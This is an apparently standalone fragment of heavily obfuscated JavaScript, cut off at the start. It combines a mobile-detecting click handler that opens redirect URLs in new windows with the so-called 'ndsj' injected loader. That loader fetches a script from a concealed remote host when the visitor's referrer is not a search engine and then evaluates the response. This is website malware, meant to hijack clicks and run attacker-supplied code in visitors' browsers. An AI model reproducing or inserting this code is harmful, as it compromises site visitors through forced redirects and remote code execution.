_0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};